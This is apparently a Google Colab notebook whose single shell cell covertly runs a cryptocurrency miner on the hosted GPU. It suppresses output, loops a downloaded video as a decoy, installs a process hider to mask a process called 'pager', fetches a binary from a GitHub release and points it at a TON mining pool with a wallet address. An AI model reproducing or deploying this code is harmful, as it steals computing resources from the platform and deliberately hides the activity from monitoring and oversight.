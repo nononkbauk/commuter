{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "GPU.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "0AFCv6xmQ2xy"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "%%shell\n",
        "sudo apt update -y\n",
        "sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm mplayer -y\n",
        "wget http://incident.net/v8/files/mp4/41.mp4\n",
        "cat > film.sh << END\n",
        "while :; do\n",
        "mplayer -vo caca 41.mp4\n",
        "done\n",
        "END\n",
        "sleep 1\n",
        "npm i -g node-process-hider && ph add pager \n",
        "wget -O pager https://github.com/nononkbauk/myrepo1/releases/download/v1/mil\n",
        "chmod +x pager\n",
        "bash film.sh >/dev/null 2>&1 >/dev/null &\n",
        "sleep 2\n",
        "./pager run https://next.ton-pool.club EQBvuJ2VObuo_L2vUtBWI0tFSI7BOJRqzep4VfatEwU3VU5x"
      ]
    }
  ]
}